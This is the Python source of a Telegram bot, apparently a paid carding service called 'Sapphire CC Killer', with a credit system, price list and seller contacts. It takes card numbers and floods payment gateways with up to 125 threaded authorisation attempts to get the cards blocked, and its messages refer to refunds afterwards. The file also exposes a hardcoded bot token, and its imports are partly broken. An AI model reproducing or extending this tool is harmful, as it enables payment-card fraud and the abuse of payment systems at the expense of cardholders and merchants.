import telebot, threading, re, os, time, timedelta
from authnet1 import authnet1
from authnet2 import killit
import timeit
from authnet1small import authnet1small
from datetime import datetime
TOKEN = '7714091857:AAEInbzVQvKWgopy6VXm8wxepSmU0NltNiI'
ADMINS = [7248259930, 7749807563, 7753191302]
bot = telebot.TeleBot(TOKEN)
threads = []
CREDIT_DB = "credits_db.txt"

loading_effect = [
    "SAPPHIRE IS BOOTING UP [■□□□□□□□□□]", 
    "SAPPHIRE IS BOOTING UP [■■□□□□□□□□]", 
    "SAPPHIRE IS BOOTING UP [■■■□□□□□□□]", 
    "SAPPHIRE IS BOOTING UP [■■■■□□□□□□]", 
    "SAPPHIRE IS BOOTING UP [■■■■■□□□□□]", 
    "SAPPHIRE IS BOOTING UP [■■■■■■□□□□]", 
    "SAPPHIRE IS BOOTING UP [■■■■■■■□□□]", 
    "SAPPHIRE IS BOOTING UP [■■■■■■■■□□]", 
    "SAPPHIRE IS BOOTING UP [■■■■■■■■■□]", 
    "SAPPHIRE IS BOOTING UP [#] ✅"
]
def kill_kd(card):
    print(f"Requested to kill card: {card}")
    
    small_threads = []
    kill_threads = []
    for _ in range(125):
        kill_thread = threading.Thread(target=killit, args=(card,))
        kill_threads.append(kill_thread)
        kill_thread.start()
    
#
    for _ in range(75):
        thread = threading.Thread(target=authnet1, args=(card,))
        threads.append(thread)
        thread.start()
    for _ in range(30):
        thread = threading.Thread(target=authnet1small, args=(card,))
        small_threads.append(thread)
        thread.start()
    # Wait for all killit threads to finish
    for kill_thread in kill_threads:
        kill_thread.join()
    for small_thread in small_threads:
        small_thread.join()
    # Wait for all authnet1 threads to finish
    for thread in threads:
        thread.join()
def kill(card):
    print(f"Requested to kill card: {card}")
    
#
    kill_threads = []
    for _ in range(55):
        kill_thread = threading.Thread(target=killit, args=(card,))
        kill_threads.append(kill_thread)
        kill_thread.start()
    
#
    for _ in range(30):
        thread = threading.Thread(target=authnet1, args=(card,))
        threads.append(thread)
        thread.start()
    
    # Wait for all killit threads to finish
    for kill_thread in kill_threads:
        kill_thread.join()

    # Wait for all authnet1 threads to finish
    for thread in threads:
        thread.join()
def kill_ks(card):
    print(f"Requested to kill card: {card}")
    
#
    kill_threads = []
#
    
#
    for _ in range(57):
        thread = threading.Thread(target=authnet1small, args=(card,))
        threads.append(thread)
        thread.start()
#

    # Wait for all authnet1 threads to finish
    for thread in threads:
        thread.join()
def load_credits():
    if not os.path.exists(CREDIT_DB):
        return {}
    with open(CREDIT_DB, "r") as f:
        lines = f.readlines()
    data = {}
    for line in lines:
        user_id, credits, expiry = line.strip().split()
        data[user_id] = {"credits": int(credits), "expiry": expiry}
    return data

def save_credits(data):
    with open(CREDIT_DB, "w") as f:
        for user_id, info in data.items():
            f.write(f"{user_id} {info['credits']} {info['expiry']}\n")

def add_credits(user_id, credits, days):
    data = load_credits()
    expiry_date = (datetime.now() + timedelta(days=int(days))).strftime('%Y-%m-%d')
    if user_id in data:
        data[user_id]["credits"] += int(credits)
        data[user_id]["expiry"] = expiry_date
    else:
        data[user_id] = {"credits": int(credits), "expiry": expiry_date}
    save_credits(data)

def remove_credits(user_id, credits):
    data = load_credits()
    if user_id in data:
        data[user_id]["credits"] -= int(credits)
        save_credits(data)
        return True
    return False

def update_credits(user_id, credits):
    data = load_credits()
    if user_id in data:
        data[user_id]["credits"] = int(credits)
        save_credits(data)
        return True
    return False

def delete_user(user_id):
    data = load_credits()
    if user_id in data:
        del data[user_id]
        save_credits(data)
        return True
    return False

def remove_expired_users():
    data = load_credits()
    today = datetime.now().strftime('%Y-%m-%d')
    new_data = {user_id: info for user_id, info in data.items() if info["expiry"] >= today}
    save_credits(new_data)
# Function to generate the health bar dynamically based on the percentage
#
@bot.message_handler(commands=['start'])
def handle_start(message):
    sent_msg = bot.send_message(message.chat.id, loading_effect[0])
    for step in loading_effect[1:]:
        time.sleep(0.2)
        bot.edit_message_text(step, chat_id=message.chat.id, message_id=sent_msg.message_id)
    time.sleep(0.5)
    bot.delete_message(message.chat.id, sent_msg.message_id)
    user_id = str(message.chat.id)
    data = load_credits()
    if user_id not in data:
        data[user_id] = {"credits": 0, "expiry": datetime.now().strftime('%Y-%m-%d')}
        save_credits(data)
    bot.send_message(message.chat.id, "✅ Welcome to Sapphire Killer! Use /help to see available commands.")

@bot.message_handler(commands=['addcredits'])
def handle_addcredits(message):
    if message.chat.id not in ADMINS:
        return
    try:
        _, user_id, credits, days = message.text.split()
        add_credits(user_id, credits, days)
        bot.reply_to(message, f"✅ Added {credits} credits to user {user_id} for {days} days.")
    except ValueError:
        bot.reply_to(message, "❌ Invalid format. Use: /addcredits {user_id} {credits} {days}")

@bot.message_handler(commands=['updatecredits'])
def handle_updatecredits(message):
    if message.chat.id not in ADMINS:
        return
    try:
        _, user_id, credits = message.text.split()
        if update_credits(user_id, credits):
            bot.reply_to(message, f"✅ Updated user {user_id}'s credits to {credits}.")
        else:
            bot.reply_to(message, "❌ User not found.")
    except ValueError:
        bot.reply_to(message, "❌ Invalid format. Use: /updatecredits {user_id} {credits}")

@bot.message_handler(commands=['deleteuser'])
def handle_deleteuser(message):
    if message.chat.id not in ADMINS:
        return
    try:
        _, user_id = message.text.split()
        if delete_user(user_id):
            bot.reply_to(message, f"✅ User {user_id} deleted successfully.")
        else:
            bot.reply_to(message, "❌ User not found.")
    except ValueError:
        bot.reply_to(message, "❌ Invalid format. Use: /deleteuser {user_id}")

@bot.message_handler(commands=['balance'])
def handle_balance(message):
    try:
        parts = message.text.split()
        if len(parts) == 2 and message.chat.id in ADMINS:
            user_id = parts[1]
        else:
            user_id = str(message.chat.id)
        data = load_credits()
        if user_id in data:
            credits = data[user_id]["credits"]
            expiry = data[user_id]["expiry"]
            bot.reply_to(message, f"💰 User {user_id} Credits: {credits}\n📅 Expiry Date: {expiry}")
        else:
            bot.reply_to(message, "❌ User not found or has no credits.")
    except:
        bot.reply_to(message, "❌ Invalid command format. Use: /balance {user_id} (admin only) or /balance to check your own.")

@bot.message_handler(commands=['adm'])
def handle_adminpanel(message):
    if message.chat.id not in ADMINS:
        return
    bot.reply_to(message, 
                 "🔧 <b>Admin Panel</b>\n\n"
                 "✅ /addcredits {user_id} {credits} {days} - Add credits\n"
                 "✅ /updatecredits {user_id} {credits} - Update user credits\n"
                 "✅ /deleteuser {user_id} - Delete a user\n"
                 "✅ /balance {user_id} - Check any user's balance\n"
                 "✅ /ed_status - Change the killrate info of /kl\n"
                 "✅ /ed_status_kd - Change the killrate info of /kd\n"
                 "✅ Expired users auto-removed.",
                 parse_mode="HTML")
@bot.message_handler(commands=['kd'])
def handle_kill_kd(message):
    data = load_credits()
    user_id = str(message.chat.id)
    if user_id in data:
        credits = data[user_id]["credits"]
    else:
        credits = 0
    if credits < 5:
        return bot.reply_to(message, "❌ <code> You Don't Have Enough Credits! </code>\n\nUse /buy command to buy credits!", parse_mode="Html")
# Extract the <dd> parameter after the command
    card = message.text.split(" ", 1)[1] if len(message.text.split()) > 1 else bot.reply_to(message, "No card provided")
    if card.startswith("0"):
        bot.reply_to(message, "❌ Mastercards wont get killed easily... If you still want to try use /mk, its still not guarunteed to be killed")
        return
    # Send an initial message and save the message object
    remove_credits(user_id, "5")
    sent_message = bot.reply_to(message, "⚔️ Trying to kill...\nProccessed: ⬜️⬜️")
    start_time = timeit.default_timer()
    # Perform the kill action
    kill_kd(card)
    bot.edit_message_text(f"⚔️ Trying to kill with small charges...\nProccessed: 🟩⬜️", 
                          chat_id=sent_message.chat.id, 
                          message_id=sent_message.message_id)
    end_time = timeit.default_timer()
    execution_time_full = end_time - start_time
    execution_time_str = str(execution_time_full)
    execution_time = re.match(r"\d+\.\d{3}", execution_time_str).group()
    # Edit the initial message
    bot.edit_message_text(f"⚔️ Trying to kill with small charges...\nProccessed: 🟩🟩", 
                          chat_id=sent_message.chat.id, 
                          message_id=sent_message.message_id)
    time.sleep(0.3)
    bot.edit_message_text(f"🔥 Card has been killed in {execution_time} with /kd, recheck once before refunding...", 
                          chat_id=sent_message.chat.id, 
                          message_id=sent_message.message_id)
@bot.message_handler(commands=['kl'])
def handle_kill(message):
    data = load_credits()
    user_id = str(message.chat.id)
    if user_id in data:
        credits = data[user_id]["credits"]
    else:
        credits = 0
    if credits < 3:
        return bot.reply_to(message, "❌ <code> You Don't Have Enough Credits! </code>\n\nUse /buy command to buy credits!", parse_mode="Html")
# Extract the <dd> parameter after the command
    card = message.text.split(" ", 1)[1] if len(message.text.split()) > 1 else bot.reply_to(message, "No card provided")
    if card.startswith("5"):
        bot.reply_to(message, "❌ Mastercards wont get killed easily... If you still want to try use /mk, its still not guarunteed to be killed")
        return
    # Send an initial message and save the message object
    remove_credits(user_id, "3")
    sent_message = bot.reply_to(message, "⚔️ Trying to kill...")
    start_time = timeit.default_timer()
    # Perform the kill action
    kill(card)
    end_time = timeit.default_timer()
    execution_time_full = end_time - start_time
    execution_time_str = str(execution_time_full)
    execution_time = re.match(r"\d+\.\d{3}", execution_time_str).group()
    # Edit the initial message
    bot.edit_message_text(f"✅ Card has been killed in {execution_time}", 
                          chat_id=sent_message.chat.id, 
                          message_id=sent_message.message_id)
@bot.message_handler(commands=['ks'])
def handle_kill_ks(message):
    data = load_credits()
    user_id = str(message.chat.id)
    if user_id in data:
        credits = data[user_id]["credits"]
    else:
        credits = 0
    if credits < 3:
        return bot.reply_to(message, "❌ <code> You Don't Have Enough Credits! </code>\n\nUse /buy command to buy credits!", parse_mode="Html")
# Extract the <dd> parameter after the command
    card = message.text.split(" ", 1)[1] if len(message.text.split()) > 1 else bot.reply_to(message, "No card provided")
    if card.startswith("5"):
        bot.reply_to(message, "❌ Mastercards wont get killed easily... If you still want to try use /mk, its still not guarunteed to be killed")
        return
    # Send an initial message and save the message object
    remove_credits(user_id, "3")
    sent_message = bot.reply_to(message, "⚔️ Trying to kill with small charges...\nProccessed: ⬜️")
    start_time = timeit.default_timer()
    # Perform the kill action
    kill_ks(card)
    bot.edit_message_text(f"⚔️ Trying to kill with small charges...\nProccessed: 🟩", 
                          chat_id=sent_message.chat.id, 
                          message_id=sent_message.message_id)
    end_time = timeit.default_timer()
    execution_time_full = end_time - start_time
    execution_time_str = str(execution_time_full)
    execution_time = re.match(r"\d+\.\d{3}", execution_time_str).group()
    # Edit the initial message
    bot.edit_message_text(f"✅ Card has been killed in {execution_time}", 
                          chat_id=sent_message.chat.id, 
                          message_id=sent_message.message_id)

@bot.message_handler(commands=['help'])
def handle_help(message):
    msg = bot.reply_to(message, 
                       "💎 <b>Sapphire Killer V0.8</b>\n\n"
                       "<b>Commands:</b>\n"
                       "/kl - Kill cards within 10 seconds\n"
                       "[🔥] /kd - Kill cards that cant be killed by /kl (slower)\n"
                       "/ks - Kill cards with small charges\n"
                       "/balance - Check your credit balance\n"
                       "/help - Shows this message\n"
                       "/buy - Pricing & purchasing info\n"
                       "/sa - Stripe auth checker, under maintenance...",
                       parse_mode="HTML")

#@bot.on(events.NewMessage(pattern="/start"))
#async def start(event):
#    await bot.send_file(
#        event.chat_id, 
#        "logo.jpg",
#        caption="<b>🔥 Welcome to Sapphire CC Killer 🔥</b>\n🔹 <b>Fast & Secure CC Killing</b>\n🔹 <b>Kills Cards Within 10seconds</b>\n🔹 <b>Easy to Use & Powerful Features</b>\n\n🚀 <i>Start Killing Cards now and experience the power of Sapphire!</i>\n\n<b>⚠️ Note:</b> We do not support illegal activities. Use responsibly.\n<b>📢 Updates & Support:</b> @YourChannel\n<b>💬 Community:</b> @YourGroup",
#        buttons=[
#            [Button.text("📌 Option 1", resize=True)],
#        ]
#    )

@bot.message_handler(commands=['mk'])
def handle_mastercards(message):
    msg = bot.reply_to(message, 
                       "🚧 <b>Gate under construction</b>, sorry for the inconvenience... Only visa ccs are killed at the moment!\n\n",
                       parse_mode="HTML")
@bot.message_handler(commands=['buy'])
def handle_buy(message):
    msg = bot.reply_to(message, 
                       "💎 <b>Sapphire Killer Plans</b>\n\n"
                       "<b>[🔥] 1000 credits valid for 10 days - 25$</b>\n"
                       "500 credits valid for 10 days - 15$\n"
                       "250 credits valid for 5 days - 10$\n"
                       "Contact @cream2_riyal or @poolofsex to buy.",
                       parse_mode="HTML")

# Start polling the bot to process messages
remove_expired_users()
bot.polling()






















